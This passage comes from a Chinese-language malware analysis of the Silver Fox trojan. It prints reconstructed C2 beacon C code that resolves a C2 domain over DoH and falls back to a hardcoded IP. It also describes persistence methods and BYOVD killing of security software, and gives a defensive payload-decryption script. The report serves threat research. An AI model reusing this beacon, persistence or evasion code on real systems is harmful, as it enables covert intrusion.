+<span class="w">        </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 设置Content-Type头 */</span>
+<span class="w">    </span><span class="n">WinHttpAddRequestHeaders</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span>
+<span class="w">        </span><span class="sa">L</span><span class="s">&quot;Content-Type: application/dns-message&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">WINHTTP_ADDREQ_FLAG_ADD</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 发送DoH请求 */</span>
+<span class="w">    </span><span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span><span class="w"> </span><span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">                       </span><span class="n">dns_query</span><span class="p">,</span><span class="w"> </span><span class="n">query_len</span><span class="p">,</span><span class="w"> </span><span class="n">query_len</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 读取DoH响应（包含DNS响应） */</span>
+<span class="w">    </span><span class="n">WinHttpReadData</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">response</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">bytes_read</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 从DNS响应中解析A记录IP */</span>
+<span class="w">    </span><span class="cm">/* 跳过DNS Header(12) + Question段，定位Answer段 */</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">12</span><span class="p">;</span>
+<span class="w">    </span><span class="cm">/* 跳过QNAME */</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span><span class="w">  </span><span class="cm">/* null + QTYPE(2) + QCLASS(2) */</span>
+
+<span class="w">    </span><span class="cm">/* 解析Answer段的A记录 */</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">bytes_read</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* 跳过NAME (2字节压缩指针) */</span>
+<span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">rtype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="w">  </span><span class="cm">/* CLASS(2) + TTL(4) */</span>
+<span class="w">        </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">rdlength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rtype</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x0001</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">rdlength</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="cm">/* A记录，提取IP */</span>
+<span class="w">            </span><span class="n">snprintf</span><span class="p">(</span><span class="n">resolved_ip</span><span class="p">,</span><span class="w"> </span><span class="n">ip_len</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%d.%d.%d.%d&quot;</span><span class="p">,</span>
+<span class="w">                     </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="p">],</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">],</span>
+<span class="w">                     </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">3</span><span class="p">]);</span>
+<span class="w">            </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
+<span class="w">            </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
+<span class="w">            </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">rdlength</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* C2上线主流程 */</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">c2_beacon_main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">c2_ip</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+<span class="w">    </span><span class="cm">/* 通道1: DoH解析C2域名 */</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resolve_c2_via_doh</span><span class="p">(</span><span class="n">DOH_SERVER_ALIDNS</span><span class="p">,</span><span class="w"> </span><span class="n">C2_DOMAIN</span><span class="p">,</span><span class="w"> </span><span class="n">c2_ip</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* AliDNS失败，尝试Google DNS */</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resolve_c2_via_doh</span><span class="p">(</span><span class="n">DOH_SERVER_GOOGLE</span><span class="p">,</span><span class="w"> </span><span class="n">C2_DOMAIN</span><span class="p">,</span><span class="w"> </span><span class="n">c2_ip</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="cm">/* DoH全失败，回退到硬编码IP */</span>
+<span class="w">            </span><span class="n">strncpy</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;8.218.106.149&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 发送上线Beacon并建立三通道通信 */</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">establish_tcp_channel</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">,</span><span class="w"> </span><span class="n">C2_PORT</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* TCP自定义协议通道建立成功 */</span>
+<span class="w">        </span><span class="n">send_beacon</span><span class="p">(</span><span class="n">BEACON_MAGIC</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">BEACON_MAGIC</span><span class="p">));</span>
+<span class="w">        </span><span class="n">enter_command_loop</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">establish_https_channel</span><span class="p">(</span><span class="n">c2_ip</span><span class="p">,</span><span class="w"> </span><span class="mi">443</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* 回退到WinHTTP HTTPS通道 */</span>
+<span class="w">        </span><span class="n">send_beacon_https</span><span class="p">();</span>
+<span class="w">        </span><span class="n">enter_command_loop_https</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>6.4 TCP自定义协议格式</h3>
+<p>备用通道1采用自定义二进制协议，其消息格式为：</p>
+<div class="highlight"><pre><span></span><code>┌──────────┬──────────┬───────────────────────┐
+│ 消息类型  │  标志位   │     数据载荷          │
+│ (3 bytes)│ (7 bytes)│    (变长)             │
+└──────────┴──────────┴───────────────────────┘
+</code></pre></div>
+
+<ul>
+<li><strong>消息类型（3字节）</strong>：标识消息类别，如心跳包、指令响应、文件回传等</li>
+<li><strong>标志位（7字节）</strong>：携带控制标志，如加密标志、压缩标志、分片标志等</li>
+<li><strong>数据载荷（变长）</strong>：实际传输的数据，AtlasCross变种使用ChaCha20加密</li>
+</ul>
+<hr />
+<h2>七、持久化机制全景</h2>
+<p>银狐木马本轮攻击部署了五重持久化机制，确保即使部分机制被发现清除，仍可通过其他途径重新激活：</p>
+<h3>7.1 注册表Run/RunOnce键值</h3>
+<p>最经典的持久化方式，在<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>或<code>RunOnce</code>键下创建自启动项，指向恶意可执行文件路径。该方式实现简单但极易被终端安全产品检测。</p>
+<h3>7.2 计划任务伪装</h3>
+<p>创建以SYSTEM权限运行的计划任务，触发频率为每分钟一次。任务名伪装为<code>MicrosoftEdgeUpdate</code>等合法系统更新任务名，以降低运维人员警觉。由于以SYSTEM权限运行，该持久化方式比注册表Run键更为隐蔽和强大。</p>
+<h3>7.3 Phantom Persistence（幽灵持久化）</h3>
+<p>该机制是本轮攻击中最具创新性的持久化技术。攻击者利用<code>RegisterApplicationRestart</code>API注册应用程序重启回调，并通过<code>SetProcessShutdownParameters</code>调整进程关闭优先级。当系统关机或重启时，操作系统会向已注册的应用程序发送关机通知，攻击者在此信号处理中触发恶意载荷的重新部署。由于该持久化不依赖注册表Run键或计划任务等传统自启动位置，常规持久化扫描工具无法发现。</p>
+<h3>7.4 GAC全局程序集劫持</h3>
+<p>GAC（Global Assembly Cache）是.NET框架的全局程序集缓存。攻击者将恶意DLL放置在GAC目录中，当任何.NET应用程序加载同名程序集时，恶意DLL将被优先加载执行。该方式影响范围广，但需要管理员权限部署。</p>
+<h3>7.5 进程注入系统核心进程</h3>
+<p>将恶意代码注入到<code>explorer.exe</code>、<code>svchost.exe</code>等系统核心进程中长期驻留。由于这些进程为系统正常进程，被注入后与正常系统进程混为一体，进程列表层面难以区分。配合BYOVD驱动加载后安全软件已被终止，进程注入过程不受阻碍。</p>
+<hr />
+<h2>八、样本深度分析：XOR流密码解密</h2>
+<h3>8.1 解密算法分析</h3>
+<p>银狐木马加载器层使用的XOR流密码解密算法具有以下特征：</p>
+<ol>
+<li><strong>种子生成</strong>：取文件前4字节作为初始种子A，将种子A与文件总大小进行异或运算，生成实际解密密钥种子B</li>
+<li><strong>就地解密</strong>：从文件第5字节开始，依次与基于种子B生成的密钥流进行XOR运算</li>
+<li><strong>密钥流演化</strong>：每解密一个字节，密钥流状态进行一次更新（通常为简单的算术运算组合）</li>
+</ol>
+<p>这种设计使得密钥与具体样本的文件大小绑定，同一份载荷在不同样本中因打包方式不同导致文件大小不同，密钥也随之变化，增加了基于固定密钥的批量解密难度。但由于算法结构简单，分析人员一旦理解了密钥生成和演化逻辑，即可编写脚本批量解密。</p>
+<h3>8.2 XOR流密码解密Python脚本</h3>
+<p>以下为基于逆向分析还原的XOR流密码解密脚本，可用于从银狐木马样本中提取加密载荷：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">银狐木马 XOR 流密码解密脚本</span>
+<span class="sd">基于逆向分析还原的解密算法</span>
+
+<span class="sd">用法: python3 silverfox_xor_decrypt.py &lt;input_file&gt; &lt;output_file&gt;</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">generate_xor_key_stream</span><span class="p">(</span><span class="n">seed</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    基于种子生成XOR密钥流。</span>
+<span class="sd">    密钥流演化逻辑：每轮对种子进行乘法+加法混淆后取低8位。</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">key_stream</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
+    <span class="n">state</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>  <span class="c1"># 保持32位无符号整数</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+        <span class="c1"># 密钥流状态演化：state = (state * 0x41C64E6D + 0x3039) &amp; 0xFFFFFFFF</span>
+        <span class="c1"># 使用LCG（线性同余生成器）变体</span>
+        <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">state</span> <span class="o">*</span> <span class="mh">0x41C64E6D</span> <span class="o">+</span> <span class="mh">0x3039</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
+        <span class="n">key_stream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">state</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>  <span class="c1"># 取中间字节增加不可预测性</span>
+
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">key_stream</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">decrypt_xor_payload</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">file_size</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    执行XOR流密码就地解密。</span>
+
+<span class="sd">    算法步骤:</span>
+<span class="sd">    1. 取前4字节作为初始种子A (little-endian)</span>
+<span class="sd">    2. 种子B = 种子A XOR 文件大小</span>
+<span class="sd">    3. 从第5字节开始与密钥流XOR解密</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;数据过短，无法解密&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 步骤1: 提取前4字节作为种子A</span>
+    <span class="n">seed_a</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 种子A (前4字节): 0x</span><span class="si">{</span><span class="n">seed_a</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 步骤2: 与文件大小异或生成种子B</span>
+    <span class="n">seed_b</span> <span class="o">=</span> <span class="n">seed_a</span> <span class="o">^</span> <span class="n">file_size</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 文件大小: </span><span class="si">{</span><span class="n">file_size</span><span class="si">}</span><span class="s2"> (0x</span><span class="si">{</span><span class="n">file_size</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 种子B (种子A ^ 文件大小): 0x</span><span class="si">{</span><span class="n">seed_b</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 步骤3: 生成密钥流并解密</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>  <span class="c1"># 跳过前4字节种子</span>
+    <span class="n">key_stream</span> <span class="o">=</span> <span class="n">generate_xor_key_stream</span><span class="p">(</span><span class="n">seed_b</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+        <span class="n">decrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_stream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">detect_payload_type</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;检测解密后的载荷类型&quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;未知&quot;</span>
+
+    <span class="c1"># PE文件特征</span>
+    <span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;MZ&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;PE可执行文件&quot;</span>
+
+    <span class="c1"># Shellcode常见特征</span>
+    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xFC</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xE9</span><span class="p">:</span>  <span class="c1"># CLD 或 JMP</span>
+        <span class="k">return</span> <span class="s2">&quot;Shellcode (可能)&quot;</span>
+
+    <span class="c1"># ZIP特征</span>
+    <span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;PK&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;ZIP压缩包&quot;</span>
+
+    <span class="c1"># 检查是否为XML配置</span>
+    <span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;&lt;?xml&#39;</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[:</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;XML配置文件&quot;</span>
+
+    <span class="k">return</span> <span class="s2">&quot;未知格式&quot;</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;用法: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;输入文件&gt; &lt;输出文件&gt;&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">input_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">output_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="c1"># 读取输入文件</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="n">file_size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">input_file</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 已加载文件: </span><span class="si">{</span><span class="n">input_file</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 文件大小: </span><span class="si">{</span><span class="n">file_size</span><span class="si">}</span><span class="s2"> bytes&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 前16字节 (hex): </span><span class="si">{</span><span class="n">data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">()</span>
+
+    <span class="c1"># 执行解密</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] 开始XOR流密码解密...&quot;</span><span class="p">)</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_xor_payload</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">file_size</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 解密完成，载荷大小: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 解密后前32字节 (hex): </span><span class="si">{</span><span class="n">decrypted</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 检测载荷类型</span>
+    <span class="n">payload_type</span> <span class="o">=</span> <span class="n">detect_payload_type</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 载荷类型检测: </span><span class="si">{</span><span class="n">payload_type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 写入输出文件</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 解密载荷已写入: </span><span class="si">{</span><span class="n">output_file</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<p>该脚本实现了完整的XOR流密码解密流程，包括种子提取、密钥流生成、就地解密和载荷类型自动检测。分析人员可据此快速从样本中提取Stage-2和Stage-3载荷，进行后续分析。</p>
+<hr />
+<h2>九、BYOVD内核态进程终止分析</h2>
+<h3>9.1 BYOVD技术原理</h3>
+<p>BYOVD（Bring Your Own Vulnerable Driver）是指攻击者携带一个存在已知漏洞的合法内核驱动程序，在目标系统上加载后利用其漏洞实现内核态操作。本轮攻击中使用的TrueSight驱动（<code>TrueSight.sys</code>）原本是一款反作弊/系统保护驱动，因存在可通过IOCTL调用来终止任意进程的漏洞而被攻击者滥用。</p>
+<p>BYOVD攻击的核心优势在于：</p>
+<ol>
+<li><strong>绕过驱动签名验证</strong>：TrueSight驱动具有合法数字签名，可正常通过Windows驱动签名验证（需管理员权限加载）</li>
+<li><strong>内核态权限</strong>：驱动运行在Ring 0，可执行任何内核操作，包括终止受保护进程</li>
+<li><strong>安全软件自保护失效</strong>：大多数安全软件的自身保护机制（如PsSetCreateProcessNotifyRoutine回调、ObRegisterCallbacks句柄保护等）仅在用户态拦截有效，无法阻止内核态驱动直接操作进程EPROCESS结构</li>
+</ol>
+<h3>9.2 内核态进程终止C代码还原</h3>
+<p>以下为基于逆向分析还原的BYOVD内核态进程终止核心逻辑：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* ============================================================</span>
